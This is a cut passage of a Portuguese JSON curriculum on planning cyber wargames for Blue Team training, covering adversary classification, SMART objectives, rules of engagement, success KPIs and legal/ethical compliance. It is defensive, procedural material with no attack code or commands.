                            "description": "Classificar adversários em categorias como script kiddies, APTs ou insiders, determinando o realismo dos cenários com base em capacidades técnicas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e Definir Categorias de Adversários",
                                  "subSteps": [
                                    "Pesquise definições padrão de script kiddies, hackers organizados, APTs (Advanced Persistent Threats) e insiders.",
                                    "Liste características principais de cada categoria, como motivação, recursos e métodos típicos.",
                                    "Crie um quadro comparativo com colunas para cada categoria e linhas para atributos como sofisticação técnica e persistência.",
                                    "Revise exemplos reais de relatórios de incidentes (ex: MITRE ATT&CK) para validar definições.",
                                    "Anote variações dentro de categorias, como insiders maliciosos vs. involuntários."
                                  ],
                                  "verification": "Quadro comparativo completo com pelo menos 5 atributos por categoria, referenciado a fontes confiáveis.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Documentação MITRE ATT&CK, relatórios de cibersegurança (ex: Verizon DBIR), planilha ou ferramenta de quadro (Google Sheets).",
                                  "tips": "Use cores para diferenciar níveis de sofisticação no quadro para visualização rápida.",
                                  "learningObjective": "Compreender as diferenças fundamentais entre categorias de adversários cibernéticos.",
                                  "commonMistakes": "Confundir script kiddies com hackers organizados; ignorar insiders como ameaça de baixo nível."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear Capacidades Técnicas por Categoria",
                                  "subSteps": [
                                    "Para cada categoria, liste ferramentas e técnicas comuns (ex: script kiddies usam kits prontos como LOIC; APTs usam zero-days).",
                                    "Classifique capacidades em níveis: baixa (off-the-shelf), média (custom scripts), alta (desenvolvimento próprio).",
                                    "Analise métricas como tempo de dwell, evasão de detecção e impacto potencial.",
                                    "Consulte frameworks como Diamond Model ou Cyber Kill Chain para mapear táticas.",
                                    "Crie uma matriz de capacidades com exemplos de TTPs (Tactics, Techniques, Procedures)."
                                  ],
                                  "verification": "Matriz de capacidades com 4-6 TTPs por categoria, alinhada a frameworks padrão.",
                                  "estimatedTime": "3 horas",
                                  "materials": "MITRE ATT&CK Navigator, Cyber Kill Chain diagramas, artigos de threat intelligence (ex: Mandiant reports).",
                                  "tips": "Priorize TTPs observáveis em logs para facilitar classificação posterior.",
                                  "learningObjective": "Associar capacidades técnicas específicas a níveis de sofisticação de adversários.",
                                  "commonMistakes": "Superestimar capacidades de script kiddies ou subestimar insiders com acesso privilegiado."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenvolver Critérios de Classificação de Cenários",
                                  "subSteps": [
                                    "Defina rubrica de classificação baseada em evidências: ferramentas usadas, complexidade de exploits, persistência.",
                                    "Crie perguntas guiadas: 'Exploit é zero-day ou público?' 'Há custom malware?' 'Ataque é oportunista ou direcionado?'",
                                    "Teste rubrica em 2-3 cenários simples de amostra.",
                                    "Inclua fatores contextuais como motivação e recursos inferidos.",
                                    "Refine rubrica com base em testes iniciais para cobrir ambiguidades."
                                  ],
                                  "verification": "Rubrica documentada com 5-8 critérios ponderados e exemplos de aplicação.",
                                  "estimatedTime": "2.5 horas",
                                  "materials": "Modelos de rubricas (ex: NIST SP 800-61), cenários de CTF ou labs de cibersegurança.",
                                  "tips": "Use pontuação numérica (1-10) para sofisticação para objetividade.",
                                  "learningObjective": "Criar uma ferramenta sistemática para classificar adversários em cenários.",
                                  "commonMistakes": "Ignorar evidências contextuais como geolocalização ou timing do ataque."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar Classificação em Cenários Hipotéticos e Verificar Realismo",
                                  "subSteps": [
                                    "Selecione 4 cenários variados (ex: DDoS simples, spear-phishing avançado, insider leak).",
                                    "Aplique rubrica para classificar cada um e justifique com evidências.",
                                    "Avalie realismo: 'Esse TTP é plausível para essa categoria?' Compare com incidentes reais.",
                                    "Documente classificações em relatório com probabilidades (ex: 80% APT).",
                                    "Discuta ambiguidades e como coletar mais inteligência para refinar."
                                  ],
                                  "verification": "Relatório com 4 cenários classificados, incluindo justificativas e scores de realismo.",
                                  "estimatedTime": "3 horas",
                                  "materials": "Cenários de threat modeling (ex: Atomic Red Team), ferramentas de simulação como Caldera.",
                                  "tips": "Registre suposições explicitamente para evitar bias de confirmação.",
                                  "learningObjective": "Praticar classificação prática e determinar realismo baseado em capacidades.",
                                  "commonMistakes": "Classificar baseado em impacto em vez de sofisticação técnica; assumir malícia sem evidências."
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Revisar e Refinar Habilidades com Autoavaliação",
                                  "subSteps": [
                                    "Revise classificações anteriores com novo conhecimento ou feedback simulado.",
                                    "Identifique padrões de erro em suas classificações.",
                                    "Crie um checklist pessoal para futuras avaliações.",
                                    "Simule peer review comparando com classificações expertas online.",
                                    "Planeje aplicação em cenários reais ou exercícios de tabletop."
                                  ],
                                  "verification": "Checklist pessoal e relatório de revisão com lições aprendidas.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": "Relatórios anteriores, fóruns de cibersegurança (ex: Reddit r/netsec), ferramentas de autoavaliação.",
                                  "tips": "Mantenha um journal de classificações para tracking de melhoria ao longo do tempo.",
                                  "learningObjective": "Consolidar conhecimento através de reflexão e iteração.",
                                  "commonMistakes": "Não questionar classificações iniciais; pular revisão crítica."
                                }
                              ],
                              "practicalExample": "Em um cenário de ataque onde um grupo usa um exploit público de RDP com ransomware genérico e não evade EDR básico, classifique como script kiddies ou hackers organizados de baixa sofisticação (score 3/10), pois faltam custom tools e persistência avançada, similar ao incidente WannaCry inicial.",
                              "finalVerifications": [
                                "Classificar corretamente 4/5 cenários de teste com justificativas técnicas.",
                                "Listar 3 TTPs distintos por categoria de adversário.",
                                "Aplicar rubrica para determinar realismo com score probabilístico.",
                                "Identificar pelo menos 2 erros comuns em cenários hipotéticos.",
                                "Criar quadro comparativo validado contra fontes como MITRE.",
                                "Documentar insider threats como alta sofisticação potencial apesar de baixa técnica."
                              ],
                              "assessmentCriteria": [
                                "Precisão na distinção de categorias (80%+ acurácia em testes).",
                                "Uso de evidências técnicas vs. suposições (rubrica aplicada consistentemente).",
                                "Profundidade de justificativas (citações de TTPs e frameworks).",
                                "Capacidade de lidar com ambiguidades (discussão de probabilidades).",
                                "Integração de realismo baseado em capacidades observadas.",
                                "Qualidade da documentação e visualizações (quadros/matrizes claras)."
                              ],
                              "crossCurricularConnections": [
                                "Psicologia: Análise de mindset e motivação do adversário (comportamental).",
                                "Análise de Dados: Processamento de logs para inferir sofisticação.",
                                "Estratégia Militar: Analogia com níveis de ameaça em inteligência (ex: Sun Tzu).",
                                "Gestão de Riscos: Integração em avaliações de risco quantitativas.",
                                "Inteligência Artificial: Uso de ML para classificação automatizada de threats."
                              ],
                              "realWorldApplication": "Em operações de Red Team/Blue Team, classificar adversários em exercícios de wargames para calibrar defesas; em SOCs, priorizar incidentes baseados em sofisticação estimada para alocação de recursos; em threat hunting, validar hipóteses de atribução durante investigações de breaches."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.5.2",
                        "name": "Definição de Escopo e Regras de Engajamento",
                        "description": "Estabelecimento de limites operacionais, objetivos claros e regras para garantir simulações seguras e eficazes em jogos de guerra cibernética.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.5.2.1",
                            "name": "Definir objetivos SMART para cenários",
                            "description": "Criar objetivos Específicos, Mensuráveis, Alcançáveis, Relevantes e Temporais para simulações, alinhando com metas de treinamento do Blue Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os componentes do framework SMART",
                                  "subSteps": [
                                    "Estude a definição de cada letra do acrônimo SMART: Specific (Específico), Measurable (Mensurável), Achievable (Alcançável), Relevant (Relevante) e Time-bound (Temporal).",
                                    "Revise exemplos de objetivos ruins versus SMART em contextos de cibersegurança, como defesa em jogos de guerra.",
                                    "Crie um checklist pessoal com perguntas chave para cada componente (ex: Specific - O quê, quem, onde?).",
                                    "Discuta com um parceiro ou anote como SMART se aplica a cenários de Blue Team.",
                                    "Memorize uma frase mnemônica para recordar SMART rapidamente."
                                  ],
                                  "verification": "Checklist preenchido com pelo menos uma pergunta por componente e 3 exemplos revisados anotados.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Folha de checklist SMART (template online ou impresso), exemplos de objetivos de cibersegurança (documentos de referência como NIST ou MITRE).",
                                  "tips": "Use cores diferentes para destacar cada componente SMART em seus exemplos para visualização rápida.",
                                  "learningObjective": "Dominar os 5 pilares do SMART e sua relevância em planejamento de cenários cibernéticos.",
                                  "commonMistakes": "Confundir 'Mensurável' com vago (ex: 'melhorar defesa' em vez de 'reduzir tempo de detecção para <5 min')."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o cenário e identificar metas gerais de treinamento do Blue Team",
                                  "subSteps": [
                                    "Leia o briefing do cenário de ameaça (ex: simulação de ataque APT).",
                                    "Identifique stakeholders e objetivos principais do Blue Team (detecção, resposta, mitigação).",
                                    "Liste 3-5 metas gerais não-SMART baseadas no escopo e regras de engajamento.",
                                    "Priorize metas alinhadas com o treinamento (ex: melhorar coordenação em resposta a incidentes).",
                                    "Mapeie riscos e recursos disponíveis para contextualizar."
                                  ],
                                  "verification": "Lista de 3-5 metas gerais documentadas com priorização e mapeamento de riscos.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Briefing do cenário (PDF ou documento), quadro branco ou ferramenta digital como Miro/Trello.",
                                  "tips": "Comece pelo 'porquê' do cenário para garantir alinhamento com metas de treinamento.",
                                  "learningObjective": "Extrair metas acionáveis de um cenário de cibersegurança para Blue Team.",
                                  "commonMistakes": "Ignorar regras de engajamento, levando a metas desalinhadas."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Draftar objetivos SMART individuais para o cenário",
                                  "subSteps": [
                                    "Pegue cada meta geral e aplique Specific: defina quem, o quê, onde e como.",
                                    "Adicione Measurable: inclua métricas quantitativas (ex: taxa de detecção >90%).",
                                    "Verifique Achievable: confirme viabilidade com recursos do Blue Team.",
                                    "Assegure Relevant: ligue ao impacto no treinamento cibernético.",
                                    "Defina Time-bound: especifique prazos (ex: durante 4 horas de simulação)."
                                  ],
                                  "verification": "3 objetivos SMART draftados, cada um validado contra checklist.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Template de objetivo SMART (planilha Excel/Google Sheets), exemplos de cenários Blue Team.",
                                  "tips": "Escreva em primeira pessoa do time (ex: 'Nós detectaremos...') para maior engajamento.",
                                  "learningObjective": "Converter metas gerais em objetivos SMART completos e alinhados.",
                                  "commonMistakes": "Omitir métricas reais, tornando 'Mensurável' subjetivo."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Revisar, refinar e validar alinhamento com metas de treinamento",
                                  "subSteps": [
                                    "Compare cada objetivo com o checklist SMART para gaps.",
                                    "Teste com um peer review ou auto-avaliação: 'Isso guia ações claras no cenário?'.",
                                    "Ajuste para clareza e concisão (máx. 1 frase por objetivo).",
                                    "Verifique alinhamento coletivo com escopo do jogo de guerra.",
                                    "Documente versão final e planeje como comunicar ao time."
                                  ],
                                  "verification": "Versão final de objetivos revisada, aprovada por peer ou auto-checklist 100%.",
                                  "estimatedTime": "30 minutos",
                                  "materials": "Checklist SMART revisado, ferramenta de colaboração (Google Docs).",
                                  "tips": "Leia em voz alta para detectar ambiguidades.",
                                  "learningObjective": "Refinar objetivos para máxima eficácia em simulações cibernéticas.",
                                  "commonMistakes": "Não iterar o suficiente, deixando objetivos vagos ou irrelevantes."
                                }
                              ],
                              "practicalExample": "Cenário: Simulação de ransomware em rede corporativa. Objetivo SMART ruim: 'Melhorar defesa'. Objetivo SMART: 'O Blue Team detectará e conterá 90% dos payloads de ransomware simulados em estações críticas dentro de 30 minutos da injeção inicial, usando ferramentas SIEM disponíveis, alinhado ao treinamento de resposta rápida (até fim da simulação de 4h).'",
                              "finalVerifications": [
                                "Cada objetivo atende todos os 5 critérios SMART sem exceções.",
                                "Objetivos são acionáveis e mensuráveis durante a simulação.",
                                "Alinhamento verificado com escopo e regras de engajamento do cenário.",
                                "Versão final é concisa (1 frase por objetivo) e clara para o time.",
                                "Peer review confirma viabilidade e relevância para Blue Team.",
                                "Métricas definidas são rastreáveis com ferramentas de logging."
                              ],
                              "assessmentCriteria": [
                                "Especificidade: Detalhes claros sobre ações, responsáveis e contexto (30%).",
                                "Mensurabilidade: Métricas quantitativas precisas e rastreáveis (25%).",
                                "Alcançabilidade: Realista com recursos do Blue Team (20%).",
                                "Relevância: Forte ligação com metas de treinamento cibernético (15%).",
                                "Temporalidade: Prazos explícitos e integrados (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Gerenciamento de Projetos: Uso de SMART em PMBOK para planejamento ágil.",
                                "Liderança e Comunicação: Definição de metas claras para equipes multidisciplinares.",
                                "Análise de Dados: Métricas mensuráveis ligadas a KPIs de segurança.",
                                "Psicologia Organizacional: Motivação por metas relevantes e alcançáveis."
                              ],
                              "realWorldApplication": "Em um SOC real, objetivos SMART guiam planos de resposta a incidentes, como 'Detectar anomalias em tráfego de rede >95% em <10 min usando Splunk, durante turno de 8h', melhorando eficiência em defesas contra ataques persistentes."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.2.2",
                            "name": "Elaborar Regras de Engajamento (ROE)",
                            "description": "Redigir ROE detalhadas que especifiquem ações permitidas, proibições (ex.: sem DDoS em produção) e critérios de parada, baseadas em diretrizes éticas e legais.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisar Fundamentos Legais e Éticos",
                                  "subSteps": [
                                    "Identificar leis relevantes aplicáveis ao contexto cibernético (ex.: Marco Civil da Internet, LGPD no Brasil, ou CFAA nos EUA).",
                                    "Estudar convenções éticas internacionais (ex.: Tallinn Manual sobre Direito Internacional e Conflitos Cibernéticos).",
                                    "Analisar diretrizes de organizações como NIST, ENISA ou CERT.br sobre operações cibernéticas.",
                                    "Documentar princípios éticos chave: proporcionalidade, distinção e necessidade.",
                                    "Mapear riscos legais associados a ações ofensivas ou defensivas."
                                  ],
                                  "verification": "Lista completa de leis, diretrizes e princípios éticos pesquisados e resumidos em um documento de referência.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Documentos legais (LGPD, CFAA)",
                                    "Tallinn Manual PDF",
                                    "NIST SP 800-53",
                                    "Acesso à internet para pesquisas"
                                  ],
                                  "tips": "Priorize fontes oficiais; use ferramentas como Google Scholar para artigos acadêmicos sobre ética cibernética.",
                                  "learningObjective": "Compreender o arcabouço legal e ético que delimita operações cibernéticas.",
                                  "commonMistakes": [
                                    "Ignorar jurisdições específicas",
                                    "Confundir ética com legalidade",
                                    "Não citar fontes primárias"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir Objetivos e Escopo da Operação",
                                  "subSteps": [
                                    "Descrever os objetivos principais da operação cibernética (ex.: testar defesas, simular ataque APT).",
                                    "Delimitar alvos autorizados (ex.: redes simuladas, IPs específicos).",
                                    "Especificar papéis e responsabilidades da equipe (atacantes, defensores, observadores).",
                                    "Determinar duração e fases da operação.",
                                    "Identificar ativos críticos a serem protegidos."
                                  ],
                                  "verification": "Documento de escopo com objetivos claros, alvos e papéis definidos e aprovados por pares.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Template de planejamento de operações",
                                    "Diagrama de rede do cenário",
                                    "Ferramentas de mind mapping (ex.: MindMeister)"
                                  ],
                                  "tips": "Use o framework SMART para objetivos (Specific, Measurable, Achievable, Relevant, Time-bound).",
                                  "learningObjective": "Estabelecer limites claros para evitar desvios na operação.",
                                  "commonMistakes": [
                                    "Objetivos vagos",
                                    "Escopo muito amplo",
                                    "Omissão de ativos críticos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Especificar Ações Permitidas e Proibições",
                                  "subSteps": [
                                    "Listar ações permitidas (ex.: scans Nmap, exploits Metasploit em VMs isoladas).",
                                    "Definir proibições explícitas (ex.: sem DDoS em produção, sem roubo de dados reais).",
                                    "Classificar ações por níveis de risco (baixo, médio, alto).",
                                    "Incluir regras de uso de ferramentas específicas.",
                                    "Garantir alinhamento com pesquisa legal/ética do Step 1."
                                  ],
                                  "verification": "Tabela de ações permitidas/proibidas com justificativas legais/éticas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Templates ROE padrão (MITRE ATT&CK)",
                                    "Lista de ferramentas cibernéticas",
                                    "Planilha Excel ou Google Sheets"
                                  ],
                                  "tips": "Use linguagem imperativa (\"Permitido: X\", \"Proibido: Y\") para clareza.",
                                  "learningObjective": "Criar regras precisas que equilibrem efetividade e segurança.",
                                  "commonMistakes": [
                                    "Regras ambíguas",
                                    "Proibições insuficientes para riscos emergentes",
                                    "Ignorar ferramentas de terceiros"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Estabelecer Critérios de Parada e Escalação",
                                  "subSteps": [
                                    "Definir condições de parada imediata (ex.: detecção por sistemas reais, impacto em civis).",
                                    "Criar protocolo de escalação (ex.: notificar comandante em 5 min).",
                                    "Especificar métricas de sucesso/falha (ex.: 80% de objetivos alcançados).",
                                    "Incluir procedimentos de reversão e recuperação.",
                                    "Planejar comunicação de emergência."
                                  ],
                                  "verification": "Seção dedicada de critérios com fluxogramas de decisão.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Ferramentas de fluxograma (Draw.io)",
                                    "Exemplos de ROE militares",
                                    "Protocolos de incidente (ex.: NIST IR)"
                                  ],
                                  "tips": "Inclua gatilhos quantificáveis (ex.: latência > 500ms) para objetividade.",
                                  "learningObjective": "Garantir mecanismos de controle para mitigar danos não intencionais.",
                                  "commonMistakes": [
                                    "Critérios subjetivos",
                                    "Sem plano de reversão",
                                    "Escalação mal definida"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Redigir, Revisar e Finalizar o Documento ROE",
                                  "subSteps": [
                                    "Compilar todos os elementos em um documento estruturado (introdução, regras, anexos).",
                                    "Realizar revisão por pares ou especialistas legais.",
                                    "Testar ROE em simulação dry-run.",
                                    "Incorporar feedback e iterar.",
                                    "Obter aprovação final e distribuir."
                                  ],
                                  "verification": "Documento ROE final assinado, versionado e distribuído à equipe.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Editor de texto (Google Docs, LaTeX)",
                                    "Checklist de revisão ROE",
                                    "Ferramentas de versionamento (Git)"
                                  ],
                                  "tips": "Mantenha o documento conciso (máx. 10 páginas) com glossário de termos.",
                                  "learningObjective": "Produzir um ROE profissional, acionável e auditável.",
                                  "commonMistakes": [
                                    "Falta de versão controlada",
                                    "Revisão superficial",
                                    "Distribuição incompleta"
                                  ]
                                }
                              ],
                              "practicalExample": "Para um jogo de guerra cibernética simulando um ataque ransomware a uma rede bancária fictícia: Permitido: Phishing simulado, exploits em VMs isoladas, C2 com Cobalt Strike. Proibido: Qualquer tráfego para IPs reais, DDoS, exfiltração de dados simulados sensíveis. Critérios de parada: Detecção por honeypots reais ou downtime >5min em serviços críticos simulados.",
                              "finalVerifications": [
                                "ROE referencia todas leis e diretrizes éticas pesquisadas.",
                                "Ações permitidas/proibidas cobrem 100% do escopo da operação.",
                                "Critérios de parada incluem gatilhos mensuráveis e protocolo de escalação.",
                                "Documento é claro, conciso e aprovado por revisores.",
                                "Simulação dry-run confirma viabilidade sem ambiguidades.",
                                "Glossário define termos técnicos para toda equipe."
                              ],
                              "assessmentCriteria": [
                                "Completude: Todos elementos obrigatórios presentes e detalhados.",
                                "Clareza: Linguagem precisa, sem ambiguidades, estrutura lógica.",
                                "Alinhamento Legal/Ético: Evidências de pesquisa integrada às regras.",
                                "Praticidade: Regras acionáveis com exemplos e verificações.",
                                "Robustez: Cobertura de riscos emergentes e cenários edge-case.",
                                "Profissionalismo: Formatação, versionamento e aprovação."
                              ],
                              "crossCurricularConnections": [
                                "Direito Internacional: Aplicação de tratados em conflitos cibernéticos.",
                                "Ética Aplicada: Análise de dilemas morais em TI.",
                                "Gerenciamento de Projetos: Planejamento de escopo e riscos.",
                                "Liderança e Comunicação: Redação de políticas claras para equipes.",
                                "Análise de Riscos: Modelagem de ameaças (ex.: STRIDE)."
                              ],
                              "realWorldApplication": "ROE são essenciais em operações de ciberdefesa nacional (ex.: exercícios da FAB ou Exército Brasileiro), pentests autorizados em empresas (conforme normas ABNT NBR ISO/IEC 27001), e red teaming corporativo para simular ataques APT sem violar leis ou causar danos reais."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.2.3",
                            "name": "Estabelecer métricas de sucesso",
                            "description": "Definir KPIs como tempo de detecção, taxa de mitigação e cobertura de TTPs para avaliar a efetividade do cenário durante e após a simulação.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o propósito e tipos de métricas de sucesso em simulações cibernéticas",
                                  "subSteps": [
                                    "Pesquise definições de KPIs em contextos de segurança cibernética, focando em simulações de jogos de guerra.",
                                    "Identifique categorias principais: detecção (ex: tempo médio de detecção), mitigação (ex: taxa de sucesso em contenção) e cobertura (ex: % de TTPs MITRE ATT&CK cobertos).",
                                    "Analise exemplos de cenários reais, como exercícios da NIST ou DEF CON, para ver métricas usadas.",
                                    "Discuta com stakeholders o alinhamento das métricas com objetivos do cenário.",
                                    "Documente um glossário inicial de termos chave como TTPs, MTTD (Mean Time to Detect) e MTTR (Mean Time to Respond)."
                                  ],
                                  "verification": "Crie um mapa mental ou tabela resumindo 5-10 tipos de KPIs com exemplos e finalize com uma nota explicando sua relevância para o cenário.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação MITRE ATT&CK",
                                    "Relatórios de exercícios cibernéticos (NIST SP 800-53)",
                                    "Ferramenta de mind mapping (ex: XMind ou papel e caneta)"
                                  ],
                                  "tips": "Comece com o framework MITRE para garantir alinhamento com ameaças reais; evite métricas genéricas sem contexto.",
                                  "learningObjective": "Entender o papel das métricas de sucesso na avaliação quantitativa e qualitativa de simulações cibernéticas.",
                                  "commonMistakes": [
                                    "Confundir métricas de desempenho com métricas de conformidade",
                                    "Ignorar o contexto do cenário específico",
                                    "Escolher KPIs não mensuráveis"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar KPIs relevantes para o escopo do cenário",
                                  "subSteps": [
                                    "Revise o escopo e regras de engajamento do cenário para mapear fases críticas (detecção, resposta, recuperação).",
                                    "Liste TTPs (Tactics, Techniques, Procedures) envolvidos no cenário usando MITRE ATT&CK Navigator.",
                                    "Priorize KPIs baseados em impacto: tempo de detecção para alertas iniciais, taxa de mitigação para ações defensivas, cobertura de TTPs para completude.",
                                    "Consulte benchmarks da indústria (ex: Verizon DBIR) para valores realistas de referência.",
                                    "Valide com equipe: realize uma sessão de brainstorming para refinar a lista inicial de 8-12 KPIs potenciais."
                                  ],
                                  "verification": "Produza uma tabela com colunas: Fase do Cenário, KPI Proposto, Justificativa, Referência de Benchmark.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "MITRE ATT&CK Navigator (online)",
                                    "Verizon DBIR relatório anual",
                                    "Planilha Google Sheets ou Excel",
                                    "Regras de engajamento do cenário"
                                  ],
                                  "tips": "Use a matriz Eisenhower para priorizar KPIs por urgência e importância; foque em 5-7 KPIs principais para evitar sobrecarga.",
                                  "learningObjective": "Mapear KPIs específicos ao escopo do cenário, garantindo relevância e mensurabilidade.",
                                  "commonMistakes": [
                                    "Selecionar KPIs irrelevantes para o tipo de ameaça",
                                    "Não considerar limitações técnicas de medição",
                                    "Sobrecarregar com KPIs demais"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Definir e quantificar KPIs com thresholds e métodos de medição",
                                  "subSteps": [
                                    "Para cada KPI, defina fórmula exata (ex: Tempo de Detecção = Timestamp_Alerta - Timestamp_Ataque).",
                                    "Estabeleça thresholds de sucesso (ex: MTTD < 15 min = Sucesso; Taxa de Mitigação > 80%).",
                                    "Especifique ferramentas de coleta de dados (ex: SIEM para logs, scripts para automação).",
                                    "Inclua métricas durante (real-time) e após (pós-simulação) a execução.",
                                    "Crie um dashboard mockup ou template para visualização dos KPIs."
                                  ],
                                  "verification": "Desenvolva um documento com 5 KPIs fully defined, incluindo fórmulas, thresholds e métodos de tracking.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas SIEM como Splunk ou ELK Stack (demo gratuita)",
                                    "Excel ou Google Sheets para fórmulas",
                                    "Templates de dashboard (ex: Grafana samples)"
                                  ],
                                  "tips": "Torne KPIs SMART (Specific, Measurable, Achievable, Relevant, Time-bound); teste fórmulas com dados simulados.",
                                  "learningObjective": "Criar definições precisas e acionáveis de KPIs para monitoramento efetivo.",
                                  "commonMistakes": [
                                    "Definir thresholds irrealistas sem benchmarks",
                                    "Esquecer métodos de coleta de dados",
                                    "Não diferenciar KPIs leading vs lagging"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Validar, documentar e integrar métricas ao plano do cenário",
                                  "subSteps": [
                                    "Realize uma revisão com stakeholders: simule cenários hipotéticos para testar viabilidade das métricas.",
                                    "Ajuste KPIs com base em feedback e constraints (ex: recursos disponíveis).",
                                    "Documente em formato padrão: seção dedicada no plano de cenário com KPIs, responsáveis e relatórios esperados.",
                                    "Integre ao ruleset de engajamento: defina como falhas em métricas afetam o exercício.",
                                    "Planeje relatório final: métricas de sucesso como critérios de debriefing."
                                  ],
                                  "verification": "Gere um relatório final validado com sign-off simulado de stakeholders e anexe ao plano de cenário.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Template de plano de cenário",
                                    "Ferramenta de colaboração (Google Docs ou Notion)",
                                    "Lista de stakeholders"
                                  ],
                                  "tips": "Use version control (ex: Git para docs) para rastrear mudanças; sempre inclua plano B para KPIs falhos.",
                                  "learningObjective": "Garantir que métricas sejam robustas, aceitas e integradas ao fluxo do exercício cibernético.",
                                  "commonMistakes": [
                                    "Pular validação com stakeholders",
                                    "Não documentar métodos de ajuste pós-teste",
                                    "Isolar métricas do ruleset"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um cenário de simulação de ransomware no setor financeiro: KPI1 - Tempo de Detecção < 10 min (medido via SIEM logs); KPI2 - Taxa de Mitigação > 90% (nº de hosts isolados / infectados); KPI3 - Cobertura de TTPs = 100% das 15 técnicas TA0004 listadas (verificado pós-exercício via ATT&CK Navigator). Durante a simulação, dashboard mostra progresso real-time; pós-simulação, relatório destaca gaps em detecção inicial.",
                              "finalVerifications": [
                                "Todos os KPIs estão alinhados com o escopo e regras de engajamento do cenário.",
                                "Cada KPI possui fórmula clara, threshold quantificável e método de medição definido.",
                                "Métricas cobrem fases durante e após a simulação, com pelo menos 5 KPIs principais.",
                                "Documentação inclui exemplos de dados simulados e dashboard mockup.",
                                "Validação com stakeholders confirma viabilidade e relevância.",
                                "Integração ao plano de cenário e ruleset está explícita."
                              ],
                              "assessmentCriteria": [
                                "Precisão e relevância dos KPIs selecionados (80% alinhados com TTPs do cenário).",
                                "Mensurabilidade: todas fórmulas e métodos são acionáveis (sem ambiguidades).",
                                "Completude: cobertura de detecção, mitigação e TTPs com thresholds realistas.",
                                "Documentação clara e profissional, pronta para uso em exercício real.",
                                "Criatividade na integração com ferramentas e visualizações.",
                                "Ausência de erros comuns como thresholds irreais ou KPIs não quantificáveis."
                              ],
                              "crossCurricularConnections": [
                                "Estatística e Análise de Dados: Cálculo de médias, desvios e benchmarks.",
                                "Gestão de Projetos: Definição de OKRs e KPIs em metodologias ágeis (ex: Scrum).",
                                "Engenharia de Software: Métricas de performance em DevSecOps pipelines.",
                                "Negócios e Estratégia: Alinhamento de métricas com ROI de segurança cibernética.",
                                "Psicologia Organizacional: Métricas para treinamento e avaliação de equipes."
                              ],
                              "realWorldApplication": "Em um SOC de uma grande empresa, durante um purple team exercise simulando APT28, as métricas definidas (MTTD < 30min, cobertura 95% TTPs) permitiram quantificar melhorias: redução de 40% no tempo de resposta pós-treino, justificando investimento em novas ferramentas de EDR."
                            },
                            "estimatedTime": "1.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.5.2.4",
                            "name": "Garantir conformidade legal e ética",
                            "description": "Revisar cenários para alinhamento com regulamentações como LGPD e princípios éticos de ethical hacking, evitando riscos jurídicos.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Pesquisar e compreender regulamentações relevantes",
                                  "subSteps": [
                                    "Identificar leis aplicáveis como LGPD, Marco Civil da Internet e normas de ethical hacking (ex: EC-Council Code of Ethics).",
                                    "Ler e resumir os principais artigos da LGPD relacionados a tratamento de dados pessoais.",
                                    "Estudar princípios éticos de ethical hacking, como consentimento, minimização de danos e divulgação responsável.",
                                    "Consultar guidelines de órgãos como ANPD (Autoridade Nacional de Proteção de Dados).",
                                    "Criar um glossário de termos chave para referência rápida."
                                  ],
                                  "verification": "Glossário e resumo das regulamentações documentados e compreendidos via autoexplicação.",
                                  "estimatedTime": "2 horas",
                                  "materials": "Documentos oficiais LGPD (site ANPD), Código de Ética EC-Council, artigos jurídicos online.",
                                  "tips": "Use fontes oficiais para evitar interpretações erradas; anote citações exatas.",
                                  "learningObjective": "Compreender o escopo legal e ético aplicável a cenários de segurança cibernética.",
                                  "commonMistakes": "Ignorar regulamentações locais específicas ou confundir LGPD com GDPR."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o cenário para identificar riscos legais e éticos",
                                  "subSteps": [
